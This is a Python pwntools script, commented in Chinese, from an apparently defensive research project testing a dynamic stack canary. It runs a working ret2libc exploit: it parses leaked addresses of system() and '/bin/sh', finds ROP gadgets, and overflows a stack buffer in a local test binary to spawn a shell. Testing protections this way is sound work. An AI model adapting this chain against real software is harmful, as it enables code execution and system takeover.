# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp_ret2libc.py
# 功能描述: Ret2Libc 攻击对比验证脚本。
#
#           针对 vuln_standard() 中的栈溢出漏洞发起 Ret2Libc 攻击：
#           程序通过 printf 主动泄露 system() 和 "/bin/sh" 的运行时地址，
#           脚本利用这些信息构造 ROP 链（ret 对齐 → pop rdi → sh_str → system），
#           将返回地址劫持至 system("/bin/sh")，企图获取 Shell。
#
#           预期结果：
#             - targets_baseline  : ROP 链执行成功，系统 Shell 被弹出。
#             - targets_protected : 保护版本检测到 Payload 覆盖了 Canary，
#               直接拦截，Shell 无法弹出。
#
# 用法: python3 exp_ret2libc.py          # 测试基线版本
#        python3 exp_ret2libc.py prot     # 测试动态 Canary 保护版本
#
# 依赖工具: pwntools (需要 ROPgadget 或 pwntools 内置的 search 支持)
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *
import sys, time

context.arch = 'amd64'
is_prot = len(sys.argv) > 1 and sys.argv[1] == 'prot'
target = '../output/targets_protected' if is_prot else '../output/targets_baseline'
print(f"================ 测试目标: {target} ================")

elf = ELF(target)
p = process([target, '1'])

# 解析泄露的地址
p.recvuntil(b"system")
system_addr = int(p.recvline().strip().split()[-1], 16)
p.recvuntil(b"sh_str")
sh_addr = int(p.recvline().strip().split()[-1], 16)
print(f"[+] 动态解析完毕: system -> {hex(system_addr)}, sh_str -> {hex(sh_addr)}")

# 利用 Pwntools 自动寻找 pop rdi; ret 指令
pop_rdi_ret = elf.search(asm('pop rdi; ret')).__next__()
# 【核心修复】：寻找一个纯粹的 ret 指令用来垫平栈对齐！
ret_gadget = elf.search(asm('ret')).__next__()

if is_prot:
    payload = b'A' * 100 # 暴力覆盖触发 Canary
else:
    # 构造 Ret2Libc 链: padding + pop rdi + 字符串地址 + system地址
    payload = b'A' * 40 + p64(ret_gadget) +p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)

p.recvuntil(b": ")
p.send(payload)
time.sleep(0.5)

try:
    p.sendline("echo '[☠️] Ret2Libc 攻击成功！取得系统级 Shell！'".encode())
    print(p.recvline(timeout=1).decode('utf-8', 'ignore'))
except: pass
print(p.recvall(timeout=1).decode('utf-8', 'ignore'))